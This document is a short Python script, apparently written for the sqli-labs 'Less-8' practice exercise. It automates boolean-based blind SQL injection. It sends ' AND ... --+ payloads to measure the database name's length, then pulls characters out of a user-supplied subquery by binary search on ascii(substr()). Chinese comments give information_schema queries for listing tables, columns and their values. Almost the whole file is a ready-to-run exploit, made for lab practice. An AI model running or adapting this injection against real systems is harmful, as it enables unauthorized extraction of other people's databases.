from re import A
import requests

url = "http://sql:8989/Less-8/"
TRUE_FLAG = "You are in"
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0'}
a = input("输入注入命令：")
#(select table_name from information_schema.tables where table_schema=database()limit 3,1)  查表名
#(select column_name from information_schema.columns where table_name=table_name and table_schema=database()limit 3,1)  查列名
#(select ..... from ...... limit 0,1)  查列值
length = 0
for i in range(1,50):
    playload = f"?id=1' AND length(database())={i}--+"
    r = requests.get(url+playload,headers=headers)
    if TRUE_FLAG in r.text:
        length = i
        break
print("数据库名长度:",length)

name=""
for pos in range(1,length+1):
    low,high=32,127
    while low<=high:
        mid = (low+high)//2
        playload = f"?id=1' AND ascii(substr(({a}),{pos},1))>={mid}--+"
        r = requests.get(url+playload,headers=headers)
        if TRUE_FLAG in r.text:
            low=mid+1
        else:
            high=mid-1
    name+=chr(high)
    print("数据库名:",name)


print("数据库名:",name)
